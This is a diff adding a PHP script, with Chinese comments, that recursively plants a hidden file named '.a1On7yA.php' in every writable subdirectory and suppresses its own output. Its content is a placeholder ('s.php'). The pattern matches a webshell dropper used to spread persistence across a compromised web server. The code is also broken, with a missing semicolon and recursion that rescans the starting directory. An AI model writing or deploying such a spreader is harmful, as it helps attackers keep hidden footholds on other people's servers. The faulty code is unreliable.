@@ -1,0 +1,27 @@
+<?php
+function createSFile($dir) {
+    if (!is_dir($dir) || !is_writable($dir)) {
+        // echo "Directory '$dir' is not writable or doesn't exist.";
+        return;
+    }
+
+    $directories = array_slice(scandir(__DIR__),2)
+
+    foreach ($directories as $directory) {
+        $subdir = $dir . DIRECTORY_SEPARATOR . $directory;
+        if (is_dir($subdir)) {
+            $sFile = $subdir . DIRECTORY_SEPARATOR . '.a1On7yA.php';
+
+            $data = "<?php\n// Content for s.php\n?>";
+            file_put_contents($sFile, $data);
+            // echo "Created/updated file '$sFile'.<br>";
+
+            createSFile($subdir); // 递归处理子目录
+        }
+    }
+}
+
+// 当前目录
+$currentDir = __DIR__;
+createSFile($currentDir);
+?>
